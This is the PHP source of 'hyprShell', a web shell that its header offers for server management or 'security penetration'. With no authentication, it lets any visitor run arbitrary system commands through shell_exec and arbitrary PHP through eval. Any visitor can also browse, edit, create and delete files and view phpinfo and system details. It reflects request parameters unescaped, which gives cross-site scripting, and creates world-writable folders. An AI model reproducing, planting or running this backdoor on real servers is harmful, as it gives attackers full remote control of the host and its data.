<?php
/*
 * @author Weidi Zhang [ http://github.com/ebildude123 ]
 * @license LGPL https://www.gnu.org/licenses/lgpl.html
 * 
 * hyprShell is a PHP shell that can used for many purposes 
 * including security penetration (which requires you to 
 * merge shell.php and functions.php together) or for easy 
 * online management of your server. Whatever you decided 
 * to do with it is at your own risk, and illegal activities 
 * are not condoned.
 */

if (substr(phpversion(), 0, 2) == "4.") {
	die("PHP version too old.");
}
require "functions.php";
$shellName = "hyprShell";
$versionStr = "0.1";
$shellFile = basename(__FILE__);
$rootPath = "/";

if (isset($_GET["phpinfo"])) {
	phpinfo();
	die();
}

$curPath = getcwd();

if (isset($_GET["dir"]) && !empty($_GET["dir"])) {
	$newPath = trim($_GET["dir"]);
	if (file_exists($newPath) && is_dir($newPath)) {
		$curPath = $newPath;
	}
}

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
	if (substr($curPath, -1) != "\\") {
		$curPath .= "\\";
	}
	
	$firstBS = strpos($curPath, "\\");
	if ($firstBS !== false) {
		$rootPath = substr($curPath, 0, $firstBS + 1);
	}
}
else {
	if (substr($curPath, -1) != "/") {
		$curPath .= "/";
	}
}
?><!DOCTYPE html>
<html>
<head>
	<title><?php echo "Viewing " . $curPath . " | " . $shellName; ?></title>
	<meta charset="UTF-8">
	<style>
		body { background-color: #ADADAD; }
		#center { text-align: center; }
		.main, .main2 {
			width: 90%;
			border: 1px solid black;
			margin: auto;
		}
		.main2 th, .main2 td {
			border-bottom: 1px solid black;
			border-right: thin solid;
		}
		#firstHead { border-left: thin solid; }
	</style>
</head>
<body>
<table class="main">

<tr>
<th>
<div style="font-size: 40px;"><?php echo $shellName . " v" . $versionStr; ?></div>
<hr>
</th>
</tr>

<tr>
<td>
<?php
echo "System Info: " . php_uname() . 
"<br>
OS: " . PHP_OS . "<br>
PHP Version: " . phpversion() . "<br>
Server: " . $_SERVER['SERVER_SOFTWARE'] . "<br>
PHPInfo Page: " . strToLink($shellFile . "?phpinfo", "phpinfo()", true);
?>
<hr>
</td>
</tr>

<tr>
<td>
Current Path: <?php echo $curPath; ?>
</td>
</tr>
</table>

<table class="main2">
<tr>
<th id="firstHead">Type</th>
<th>Name</th>
<th>Permissions</th>
<th>Actions</th>
</tr>
<tr>
<td colspan="4">
<?php
$contentTmp = glob($curPath . "*");

$foldersArr = array();
$filesArr = array();

foreach ($contentTmp as $content) {
	if (is_dir($content)) {
		$foldersArr[] = $content;
	}
	else {
		$filesArr[] = $content;
	}
}

natcasesort($foldersArr);
natcasesort($filesArr);


echo "<tr>
<td id=\"firstHead\" colspan=\"100%\">
<div id=\"center\">
[ " . strToLink($shellFile . "?action=newfile&arg=" . $curPath, "Create New File") . " ] 
[ " . strToLink($shellFile . "?action=newdir&arg=" . $curPath, "Create New Folder") . " ] 
[ " . strToLink($shellFile . "?action=shell", "Run Command On Server") . " ] 
[ " . strToLink($shellFile . "?action=rawphp", "Raw PHP Evaluation") . " ] 
</div>
</tr>\n";

$validActions = array("newfile", "newdir", "shell", "rawphp", "editfile", "rmfile");
if (isset($_GET["action"]) && in_array($_GET["action"], $validActions)) {
	$getAction = $_GET["action"];
	
	if ($getAction == "shell") {
?>
<tr>
<td id="firstHead" colspan="100%">
	<div id="center">
		<form method="POST" action="">
			Command: <input type="text" style="width: 70%;" name="cmd" value="<?php echo ((isset($_POST["cmd"])) ? $_POST["cmd"] : ""); ?>"> 
			<input type="submit" value="Submit">
		</form>
		
		<br>
		
		Result (Output): <br>
		<textarea rows="10" style="width: 70%; background-color: #e0e0e0;" readonly="readonly"><?php
		if (isset($_POST["cmd"]) &&  trim($_POST["cmd"]) != null) {
			$postCmd = trim($_POST["cmd"]);
			$getOutput = shell_exec($postCmd);
			
			if (trim($getOutput) == "") {
				$getOutput = "No output returned, but command was ran.\nThe command inputted: " . $postCmd;
			}
			
			echo $getOutput;
		}
		?></textarea>
		
		<br>
		
		[ <?php echo strToLink($shellFile . "?dir=" . $curPath, "Go to: " . $curPath); ?> ]
	</div>
</td>
</tr>		
<?php
die("</table>
</td>
</tr>
</table>
</body>
</html>");	
	}
	elseif ($getAction == "rawphp") {
?>
<tr>
<td id="firstHead" colspan="100%">
	<div id="center">
		<form method="POST" action="">
			Input Code (Do not include &lt;?php or ?&gt; tags): <br>
			<textarea rows="7" style="width: 70%;" name="code"><?php echo ((isset($_POST["code"])) ? $_POST["code"] : ""); ?></textarea> 
			<br>
			<input type="submit" value="Submit">
		</form>
		
		<br>
		
		Result (Output): <br>
		<textarea rows="10" style="width: 70%; background-color: #e0e0e0;" readonly="readonly"><?php
		if (isset($_POST["code"]) &&  trim($_POST["code"]) != null) {
			$postCode = trim($_POST["code"]);
			ob_start();
			eval($postCode);
			$getOutput = ob_get_contents();
			ob_end_clean();
			
			if (trim($getOutput) == "") {
				$getOutput = "No output returned, but code was executed.";
			}
			
			$getOutput = strip_tags($getOutput);
			
			echo $getOutput;
		}
		?></textarea>
		
		<br>
		
		[ <?php echo strToLink($shellFile . "?dir=" . $curPath, "Go to: " . $curPath); ?> ]
	</div>
</td>
</tr>		
<?php
die("</table>
</td>
</tr>
</table>
</body>
</html>");	
	}
	else {
		if (isset($_GET["arg"]) && trim($_GET["arg"]) != "" ) {
			$getArg = trim($_GET["arg"]);
			if ($getAction == "editfile" || $getAction == "rmfile") {
				if (file_exists($getArg)) {
					if ($getAction == "rmfile") {
						$rmOfFolder = dirname($getArg);
						@unlink($getArg);
						if (file_exists($getArg)) {
							$msgType = "Error";
							$msgMsg = "File deletion attempt failed.";
							echo redirectTo($shellFile . "?dir=" . $rmOfFolder . "&msg0=" . $msgType . "&msg1=" . $msgMsg);
						}
						else {
							$msgType = "Success";
							$msgMsg = "File deleted.";
							echo redirectTo($shellFile . "?dir=" . $rmOfFolder . "&msg0=" . $msgType . "&msg1=" . $msgMsg);
						}
					}
					elseif ($getAction == "editfile") {						
						if (isset($_POST["content"])) {
							$origFolder = dirname($getArg);
							$newContent = $_POST["content"];
							$editFile = file_put_contents($getArg, $newContent, LOCK_EX);
							if (!$editFile === false) {
								$msgType = "Success";
								$msgMsg = "File saved.";
								echo redirectTo($shellFile . "?dir=" . $origFolder . "&msg0=" . $msgType . "&msg1=" . $msgMsg);
							}
							else {
								$msgType = "Error";
								$msgMsg = "Unable to save the file.";
								echo redirectTo($shellFile . "?dir=" . $origFolder . "&msg0=" . $msgType . "&msg1=" . $msgMsg);
							}
						}
						
						$getFileContents = file_get_contents($getArg);
?>
<tr>
<td id="firstHead" colspan="100%">
	<div id="center">
		<b>File Editor:</b> Editing <?php echo $getArg; ?>
	</div>
</td>
</tr>
<tr>
<td id="firstHead" colspan="100%">
	<div id="center">
		<form method="POST" action="">
			<textarea name="content" rows="15" style="width: 70%;"><?php echo $getFileContents; ?></textarea>
			<br>
			<input type="submit" value="Save File">
		</form>
	</div>
</td>
</tr>
<?php
die("</table>
</td>
</tr>
</table>
</body>
</html>");	
					}
				}
				else {
					$msgType = "Error";
					$msgMsg = "The file you tried to change does not exist.";
					echo redirectTo($shellFile . "?msg0=" . $msgType . "&msg1=" . $msgMsg);
				}
			}
			elseif ($getAction == "newfile" || $getAction == "newdir") {
				if (file_exists($getArg) && is_dir($getArg)) {
					if ($getAction == "newdir") {
						if (isset($_POST["name"]) && !empty($_POST["name"])) {
							$newDirName = trim($_POST["name"]);
							if (strpbrk($newDirName, "\\/?%*:|\"<>") === false) {
								$newDirPath = $getArg;
								$newDirPath = trim($newDirPath, "\\");
								$newDirPath = trim($newDirPath, "/");
								
								(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? $newDirPath .= "\\" : $newDirPath .= "/";
								$newDirPath .= $newDirName;
								
								$makeDir = mkdir($newDirPath, 0777);
								if ($makeDir) {
									$msgType = "Success";
									$msgMsg = "The folder was created.";
									echo redirectTo($shellFile . "?dir=" . $newDirPath . "&msg0=" . $msgType . "&msg1=" . $msgMsg);
								}
								else {
									$msgType = "Error";
									$msgMsg = "Unable to create the folder.";
									echo redirectTo($shellFile . "?dir=" . $getArg . "&msg0=" . $msgType . "&msg1=" . $msgMsg);
								}
							}
							else {
								$msgType = "Error";
								$msgMsg = "The folder name creates invalid characters.";
								echo redirectTo($shellFile . "?dir=" . $getArg . "&msg0=" . $msgType . "&msg1=" . $msgMsg);
							}
						}
?>
<tr>
<td id="firstHead" colspan="100%">
	<div id="center">
		<form method="POST" action="">
			Location: <input type="text" style="width: 40%; background-color: #e0e0e0;" readonly="readonly" value="<?php echo $getArg; ?>"> <br>
			New Folder Name: <input type="text" name="name" style="width: 35%;"> <br>
			<input type="submit" value="Create">
		</form>
		
		[ <?php echo strToLink($shellFile . "?dir=" . $getArg, "Go to: " . $getArg); ?> ]
	</div>
</td>
</tr>
<?php
die("</table>
</td>
</tr>
</table>
</body>
</html>");
					}
					elseif ($getAction == "newfile") {
						if (isset($_POST["content"], $_POST["name"])) {
							$getContent = $_POST["content"];
							$getFileName = trim($_POST["name"]);
							
							if (strlen($getFileName) <= 0 || strlen($getFileName) > 255) {
								$msgType = "Error";
								$msgMsg = "The file name must be between 1 and 255 characters.";
								echo redirectTo($shellFile . "?dir=" . $getArg . "&msg0=" . $msgType . "&msg1=" . $msgMsg);
							}
							elseif (!strpbrk($getFileName, "\\/?%*:|\"<>") === false) {
								$msgType = "Error";
								$msgMsg = "The file name creates invalid characters.";
								echo redirectTo($shellFile . "?dir=" . $getArg . "&msg0=" . $msgType . "&msg1=" . $msgMsg);
							}
							else {
								$newFilePath = realpath($getArg . "/");
								(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? $newFilePath .= "\\" : $newFilePath .= "/";
								$newFilePath .= $getFileName;
								
								$createFile = file_put_contents($newFilePath, $getContent, LOCK_EX);
								
								if ($createFile) {
									$msgType = "Success";
									$msgMsg = "The file was created.";
									echo redirectTo($shellFile . "?dir=" . $getArg . "&msg0=" . $msgType . "&msg1=" . $msgMsg);
								}
								else {
									$msgType = "Error";
									$msgMsg = "Unable to create the file.";
									echo redirectTo($shellFile . "?dir=" . $getArg . "&msg0=" . $msgType . "&msg1=" . $msgMsg);
								}
							}
						}
?>
<tr>
<td id="firstHead" colspan="100%">
	<div id="center">
		<b>File Editor:</b> Creating new file
	</div>
</td>
</tr>
<tr>
<td id="firstHead" colspan="100%">
	<div id="center">
		<form method="POST" action="">
			Location: <input type="text" style="width: 65%; background-color: #e0e0e0;" readonly="readonly" value="<?php echo $getArg; ?>"> <br>
			File Name: <input type="text" maxlength="255" style="width: 65%;" name="name" value=""> <br>
			<textarea name="content" rows="15" style="width: 70%;"></textarea>
			<br>
			<input type="submit" value="Create File">
		</form>
		
		[ <?php echo strToLink($shellFile . "?dir=" . $getArg, "Go to: " . $getArg); ?> ]
	</div>
</td>
</tr>
<?php
die("</table>
</td>
</tr>
</table>
</body>
</html>");	
					}
				}
			}
		}
	}
}

if (isset($_GET["msg0"], $_GET["msg1"]) && !empty($_GET["msg0"]) && !empty($_GET["msg1"])) {
?>
<tr>
<td id="firstHead" colspan="100%">
	<div id="center">
	<?php echo "<b>" . trim($_GET["msg0"]) . "</b>: " . trim($_GET["msg1"]); ?>
	</div>
</td>
</tr>
<?php
}

if ($curPath != $rootPath) {
	$upDir = realpath($curPath . "/..");
	echo "<tr>
	<td id=\"firstHead\">Folder</td>
	<td>" . strToLink($shellFile . "?dir=" . $upDir, ".. (Up one directory)") . "</td>
	<td>&nbsp;</td>
	<td></td>
	</tr>\n";
}

foreach ($foldersArr as $folder) {
	$dirLoc = realpath($folder);
	
	$filePermNum = fileperms($folder);
	$filePermStr = octalToFull($filePermNum);
	
	$filePermNum = substr(sprintf('%o', $filePermNum), -4);
	
	$getNameOnly = basename($dirLoc);
	
	echo "<tr>
	<td id=\"firstHead\">Folder</td>
	<td>" . strToLink($shellFile . "?dir=" . $dirLoc, $getNameOnly) . "</td>
	<td>" . $filePermStr . " (" . $filePermNum .")</td>
	<td></td>
	</tr>\n";
}

foreach ($filesArr as $file) {
	$fileLoc = realpath($file);
	
	$filePermNum = fileperms($file);
	$filePermStr = octalToFull($filePermNum);
	
	$filePermNum = substr(sprintf('%o', $filePermNum), -4);
	
	$getNameOnly = basename($fileLoc);
	
	$getType = "File";
	if (_is_link($file)) {
		$getType = "SymLink";
		$fileLoc = _readlink($file);
	}
	
	echo "<tr>
	<td id=\"firstHead\">" . $getType . "</td>
	<td>" . $getNameOnly . "</td>
	<td>" . $filePermStr . " (" . $filePermNum .")</td>
	<td>
	[ " . strToLink($shellFile . "?action=editfile&arg=" . $fileLoc, "Edit") . " ] 
	[ " . strToLink($shellFile . "?action=rmfile&arg=" . $fileLoc, "Delete") . " ]
	</td>
	</tr>\n";
}
?>
</td>
</tr>
</table>
</body>
</html>